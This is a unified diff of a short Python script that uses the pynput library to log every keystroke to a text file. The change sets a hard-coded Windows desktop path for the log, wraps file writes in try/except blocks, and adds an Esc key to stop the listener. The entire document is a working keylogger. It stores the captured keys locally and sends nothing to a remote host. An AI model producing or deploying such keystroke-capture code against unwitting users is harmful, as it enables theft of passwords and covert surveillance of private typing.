@@ -1,12 +1,19 @@
 from pynput import keyboard
 
-def on_press(key):
-    with open("log.txt", "a") as f:
-        try:
-            f.write(f'{key.char}')
-        except AttributeError:
-            f.write(f'[{key}]')
+log_file = "C:/Users/Ali/Desktop/keylog.txt"
 
-listener = keyboard.Listener(on_press=on_press)
-listener.start()
-listener.join()
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            f.write(f" [{key}] ")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener when Esc is pressed
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
